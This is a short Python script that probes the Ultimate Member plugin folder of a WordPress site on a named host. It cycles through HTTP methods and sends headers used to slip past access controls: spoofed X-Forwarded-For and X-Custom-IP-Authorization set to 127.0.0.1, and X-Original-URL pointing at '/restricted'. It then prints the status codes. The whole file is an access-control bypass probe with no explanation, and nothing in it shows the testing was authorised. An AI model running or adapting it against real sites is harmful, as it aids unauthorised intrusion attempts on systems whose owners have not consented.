import requests

# Target URL
url = "https://test1.mohammadlotfi.com/wp-content/plugins/ultimate-member/"

# List of HTTP methods to try
methods = ["GET", "POST", "PUT", "DELETE", "OPTIONS", "HEAD"]

# List of headers to try
headers_list = [
    {"User-Agent": "Mozilla/5.0"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"Referer": "https://test1.mohammadlotfi.com/wp-content/plugins/ultimate-member/"},
    {"X-Original-URL": "/restricted"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
]

def try_methods():
    for method in methods:
        response = requests.request(method, url)
        print(f"Method: {method}, Status Code: {response.status_code}")

def try_headers():
    for headers in headers_list:
        response = requests.get(url, headers=headers)
        print(f"Headers: {headers}, Status Code: {response.status_code}")

if __name__ == "__main__":
    print("Trying different HTTP methods...")
    try_methods()
    print("\nTrying different headers...")
    try_headers()